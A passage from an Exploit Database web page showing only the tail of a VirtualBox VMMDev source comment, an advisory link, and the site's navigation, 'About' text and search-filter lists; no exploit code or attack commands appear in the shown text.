 *    that the guest is currently reading the memory (OWNER flag?).
 *  * guest writes: may be allocate a page for the host info and make
 *    the page readonly for the guest.
 *  * the information should be available only for additions drivers.
 *  * VMMDev additions driver will inform the host which version of the info it expects,
 *    host must support all versions.
 *
 */
 ```

```

**Tags:**

**Advisory/Source:**
[Link](https://blogs.securiteam.com/index.php/archives/3649)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


